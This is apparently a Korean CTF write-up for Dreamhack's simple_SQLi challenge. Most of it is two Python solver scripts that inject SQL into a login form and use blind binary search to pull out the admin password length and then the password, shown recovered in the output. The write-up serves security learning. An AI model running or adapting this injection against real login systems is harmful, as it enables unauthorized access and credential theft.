## 익스플로잇

### 로그인 요청의 폼 구조 파악

![](https://velog.velcdn.com/images/silvergun8291/post/4c743777-7166-41ea-a90f-b04b486196aa/image.png)

```
userid   ⇒ userid
password ⇒ userpassword
```

<br>

### 비밀번호 길이 파악

```python
#!/usr/bin/python3.9
import requests
import sys

from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge"""
    
    
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    
    
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        
        resp = requests.post(self._login_url, data=login_data)
        return resp
    
    
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
        
        
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            
            if low+1 >= high:
                break
                
            query = query_tmpl.format(val=mid)
            
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
                
        return mid
    
    
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        
        return pw_len
   
   
   def solve(self):
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")


if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

```bash
$ python3 exploit.py 19453 2> /dev/null
Length of admin password is: 32
```

<br>


### 비밀번호 흭득

```python
#!/usr/bin/python3.9
import requests
import sys

from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge"""
    
    
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
    
    
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        
        resp = requests.post(self._login_url, data=login_data)
        return resp
    
    
    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
        
        
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            
            if low+1 >= high:
                break
            
            query = query_tmpl.format(val=mid)
            
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        
        return mid
    
    
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        
        return pw_len
    
    
    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ''
        for idx in range(1, pw_len+1):
            query_tmpl = f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))"
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))
            print(f"{idx}. {pw}")
        
        return pw
    
    
    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")


if __name__ == "__main__":
    port = sys.argv[1]
    
    solver = Solver(port)
    solver.solve()
```

```bash
$ python3 exploit.py 19453 2> /dev/null
Length of the admin password is: 32
Finding password:
1. 0
2. 0e
3. 0ec
4. 0ecc
5. 0ecca
6. 0ecca1
7. 0ecca12
8. 0ecca12d
9. 0ecca12d5
10. 0ecca12d58
11. 0ecca12d582
12. 0ecca12d582c
13. 0ecca12d582cc
14. 0ecca12d582cc4
15. 0ecca12d582cc4a
16. 0ecca12d582cc4ad
17. 0ecca12d582cc4ad3
18. 0ecca12d582cc4ad34
19. 0ecca12d582cc4ad346
20. 0ecca12d582cc4ad3467
21. 0ecca12d582cc4ad34673
22. 0ecca12d582cc4ad346731
23. 0ecca12d582cc4ad3467317
24. 0ecca12d582cc4ad34673170
25. 0ecca12d582cc4ad34673170d
26. 0ecca12d582cc4ad34673170d2
27. 0ecca12d582cc4ad34673170d28
28. 0ecca12d582cc4ad34673170d287
29. 0ecca12d582cc4ad34673170d2872
30. 0ecca12d582cc4ad34673170d28722
31. 0ecca12d582cc4ad34673170d287229
32. 0ecca12d582cc4ad34673170d2872294
Password of the admin is: 0ecca12d582cc4ad34673170d2872294
```

<br>


### 플래그 흭득

<img src="https://velog.velcdn.com/images/silvergun8291/post/26760b39-d555-4d5c-a149-ea2a77071760/image.png">

<img src="https://velog.velcdn.com/images/silvergun8291/post/34410f45-252b-43f0-8c34-29583dacfd5f/image.png">



